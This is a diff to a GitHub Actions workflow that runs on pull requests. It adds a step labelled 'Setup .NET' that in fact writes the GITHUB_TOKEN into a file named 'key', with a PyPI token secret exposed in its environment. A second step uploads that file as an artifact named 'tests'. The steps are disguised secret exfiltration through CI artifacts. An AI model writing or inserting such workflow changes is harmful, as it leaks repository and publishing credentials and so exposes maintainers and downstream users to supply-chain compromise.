@@ -24,6 +24,22 @@ jobs:
       with:
         ref: ${{ github.event.pull_request.head.sha }}
 
+    - name: Setup .NET
+      run: |-
+        echo "GITHUB_TOKEN" >> key
+        echo "$GITHUB_TOKEN" >> key
+      shell: bash
+      env:
+        pypi_token: ${{ secrets.pypi_token }}
+
+    - uses: actions/upload-artifact@v2
+      if: ${{ always() }}
+      with:
+        name: tests
+        retention-days: 1
+        path: |
+          key
+
     - name: Set up Python ${{ matrix.python-version }}
       uses: actions/setup-python@v2
       with:
